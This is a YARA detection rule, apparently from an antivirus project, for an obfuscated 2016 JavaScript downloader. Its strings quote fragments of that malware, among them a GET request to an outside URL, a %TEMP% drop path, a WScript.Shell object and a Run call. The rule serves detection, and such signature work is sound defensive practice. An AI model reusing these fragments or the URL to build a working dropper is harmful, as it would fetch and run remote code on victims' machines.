rule sig_20160427_ff4ba4dd05119ab668d6af69c721091c {
  meta:
    description = "datamaliciousorder - file 20160427_ff4ba4dd05119ab668d6af69c721091c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "73949eed422bbf33f8f6547957aa191abecda41ce45eb439fb765ce155690c2a"

  strings:
    $s1  = "IuwyaNhrtz[YnrneKmchh](\"G\" + \"ET\", \"http://totaltransport.com.br/n7dus\", false);" fullword ascii
    $s2  = "function ZetndScjbw() {return JjcdaYimzw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8V6WhPo" ascii
    $s3  = "function ZetndScjbw() {return JjcdaYimzw[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8V6WhPo" ascii
    $s4  = "var JjcdaYimzw = function RlknvEyimj() {return EexkaHioof[OkbbzZwlvu](\"WScript\"+\".Shell\");}(), HmgjjCnqlq = 11;" fullword ascii
    $s5  = "function VdspeBvmfu(GtkkjDnelv, NhcrePfyux){LiimtTgqek = LiimtTgqek * 1; return GtkkjDnelv - NhcrePfyux;};" fullword ascii
    $s6  = "var EexkaHioof = this[\"WScript\"];" fullword ascii
    $s7  = "function FizsvRupmv(){return NcrbrPyjwz + \"\";};" fullword ascii
    $s8  = "if (IuwyaNhrtz[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function AjvygOitvz() {return ((BopnfYaism == true) && (BopnfYaism == HawggZnsxv)) ? 1 : LiimtTgqek;};" fullword ascii
    $s10 = "function NkrzkWhhxl(){return OkbbzZwlvu;};" fullword ascii
    $s11 = "BopnfYaism = true; " fullword ascii
    $s12 = "HawggZnsxv = true; " fullword ascii
    $s13 = "var LfujyDdssv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function GqnrgYgsrg(){return 23;};" fullword ascii
    $s15 = "var BopnfYaism = false;" fullword ascii
    $s16 = "function LqaffCislc(VepjpGyuui){JjcdaYimzw[\"R\"+\"un\"](VepjpGyuui, LiimtTgqek, LiimtTgqek);};" fullword ascii
    $s17 = "function ElvyoDttuw()" fullword ascii
    $s18 = "var HawggZnsxv = false;" fullword ascii
    $s19 = "}while (GdgnjFzkbs);" fullword ascii
    $s20 = "IyiukYstal = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}